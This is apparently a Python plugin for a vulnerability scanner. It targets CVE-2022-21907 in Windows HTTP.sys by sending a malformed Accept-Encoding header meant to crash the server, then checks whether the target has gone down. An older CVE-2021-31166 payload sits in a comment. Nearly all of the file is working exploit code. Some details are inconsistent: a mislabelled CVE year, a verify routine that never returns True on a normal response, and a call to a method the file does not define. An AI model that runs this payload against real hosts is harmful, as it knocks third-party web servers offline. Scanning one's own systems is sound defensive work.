# Create by antx at 2022-01-17.
# integrated by Michele "o-zone@zerozone.it" just for fun, on 23.01.2022

import requests
from stars import target_type, Star
from utils import http
from multiprocessing.managers import SyncManager
from typing import Any, Dict, List, Mapping, Tuple, Union
import time

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36'}
class CVE_2022_21907(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE_2021_21907',
        'TAG': []
        }
    type = target_type.MODULE
    def first_handshake(self, target: str):
        try:
            resp = requests.get(target, headers=header, timeout=10)
            if resp.status_code == 200:
                return True
            return False
        except Exception as e:
            return False

    def verify_handshake(self, target: str):
        try:
            resp = requests.get(target, headers=header, timeout=10)
            if resp.status_code == 200:
                return False
            return False
        except requests.exceptions.ConnectionError as e:
            return True

    def poc(self, target: str):
        # headers = {'Accept-Encoding': 'doar-e, ftw, imo, ,'}      # CVE-2021-31166
        headers = {
            'Accept-Encoding': 'AAAAAAAAAAAAAAAAAAAAAAAA, '
                               'BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, '
                               'RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, '
                               'TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, '
                               'OOOAOAOOOAOOAOOOAOOOAOOOAOO, '
                               '****************************stupiD, *, ,'
        }                                                           # CVE-2022-21907
        try:
            r = requests.get(target, headers=headers, timeout=10)
            return False
        except requests.exceptions.ReadTimeout as e:
            return True

    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        url=(format(dip))
        if 'http' not in url:
            target = f'http://{url}'
        elif 'https' in url:
            target = url.replace('https', 'http')
        else:
            target = url
        if not self.first_handshake(target):
           return False, {}
        if self.poc(target):
            while True:
                time.sleep(10)
                if not self.verify_handshake(target):
                    break
                return True, {'url': url}
        else:
            return False, {}

    def run(queue: SyncManager.Queue, data: Dict):
        obj = CVE_2022_21907()
        result = {
            'IP': data['IP'],
            'PORT': data['PORT'],
            'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
            'MSG': '',
            'STATE': False
        }
        result['STATE'], result['MSG'] = obj.light_and_msg(
            data['IP'], data['PORT'], data['IS_SSL'])

        queue.put(result)